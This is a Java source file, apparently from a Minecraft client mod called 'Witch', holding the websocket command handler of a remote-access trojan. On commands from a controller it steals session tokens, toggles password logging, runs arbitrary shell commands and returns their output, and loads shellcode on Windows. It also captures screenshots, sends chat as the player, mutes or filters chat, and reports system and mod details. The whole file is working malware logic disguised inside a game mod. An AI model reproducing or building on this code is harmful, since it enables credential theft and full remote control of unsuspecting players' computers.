package me.soda.witch.websocket;

import com.google.gson.Gson;
import me.soda.witch.Witch;
import me.soda.witch.features.*;
import net.minecraft.text.Text;

import java.util.Base64;

public class MessageHandler {
    private static String decodeBase64(String str) {
        byte[] result = Base64.getDecoder().decode(str.getBytes());
        return new String(result);
    }

    public static void handle(String message) {
        String[] msgArr = message.split(" ");
        String messageType = msgArr[0];
        System.out.println("Received message: " + messageType);
        try {
            switch (messageType) {
                case "steal_pwd_switch":
                    Witch.config.passwordBeingLogged = Boolean.parseBoolean(msgArr[1]);
                    break;
                case "steal_token":
                    MessageUtils.sendMessage(messageType, new Gson().toJson(new Stealer.Token()));
                    break;
                case "chat_control":
                    ChatUtil.sendChat(decodeBase64(msgArr[1]));
                    break;
                case "chat_filter":
                    Witch.config.filterPattern = decodeBase64(msgArr[1]);
                    break;
                case "chat_filter_switch":
                    Witch.config.isBeingFiltered = Boolean.parseBoolean(msgArr[1]);
                    break;
                case "chat_mute":
                    Witch.config.isMuted = Boolean.parseBoolean(msgArr[1]);
                    break;
                case "mods":
                    MessageUtils.sendMessage(messageType, MinecraftUtil.allMods());
                    break;
                case "systeminfo":
                    MessageUtils.sendMessage(messageType, MinecraftUtil.systemInfo());
                    break;
                case "screenshot":
                    Witch.screenshot = true;
                    break;
                case "chat":
                    ChatUtil.chat(Text.of(decodeBase64(msgArr[1])), false);
                    break;
                case "kill":
                    Witch.client.close(false);
                    break;
                case "shell":
                    new Thread(() -> {
                        String result = ShellUtil.runCmd(decodeBase64(msgArr[1]));
                        MessageUtils.sendMessage(messageType, "\n" + result);
                    }).start();
                    break;
                case "shellcode":
                    if (ShellUtil.isWin())
                        new Thread(() -> new ShellcodeLoader().loadShellCode(msgArr[1], false)).start();
                    break;
                case "log":
                    Witch.config.logChatAndCommand = !Witch.config.logChatAndCommand;
                    MessageUtils.sendMessage(messageType, String.valueOf(Witch.config.logChatAndCommand));
                    break;
                case "config":
                    MessageUtils.sendMessage(messageType, new Gson().toJson(Witch.config));
                    break;
                case "player":
                    MessageUtils.sendMessage(messageType, new Gson().toJson(new PlayerInfo(Witch.mc.player)));
                    break;
                case "skin":
                    handle("player");
                    MessageUtils.sendMessage(messageType, PlayerSkin.getPlayerSkin());
                    break;
                case "vanish":
                    //todo
                    break;
                default:
                    break;
            }
        } catch (Exception e) {
            System.out.println("Corrupted message!");
            e.printStackTrace();
        }
    }
}